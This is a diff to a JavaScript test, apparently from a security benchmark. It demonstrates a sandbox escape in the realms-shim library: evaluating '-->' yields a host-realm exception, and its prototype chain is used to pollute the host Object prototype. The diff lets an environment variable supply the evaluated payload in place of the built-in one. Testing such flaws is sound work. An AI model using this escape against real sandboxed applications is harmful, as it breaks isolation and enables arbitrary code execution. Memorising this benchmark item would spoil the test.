@@ -4,7 +4,7 @@ test("Arbitrary code execution in realms-shim", () => {
   const r = Realm.makeRootRealm();
   expect({}.polluted).toBe(undefined);
   try {
-    r.evaluate(`let HostException;
+    r.evaluate(process.env.SECBENCH_PAYLOAD || (`let HostException;
           try{
                (0, eval)('--'+'>');
           }catch(e){
@@ -12,7 +12,7 @@ test("Arbitrary code execution in realms-shim", () => {
           }
           const HostObject = HostException.__proto__.__proto__.__proto__;
           HostObject.polluted = 'yes';
-          `);
+          `));
   } catch (error) {}
-  expect({}.polluted).toBe(process.env.SECBENCH_PAYLOAD || ("yes"));
+  expect({}.polluted).toBe("yes");
 });
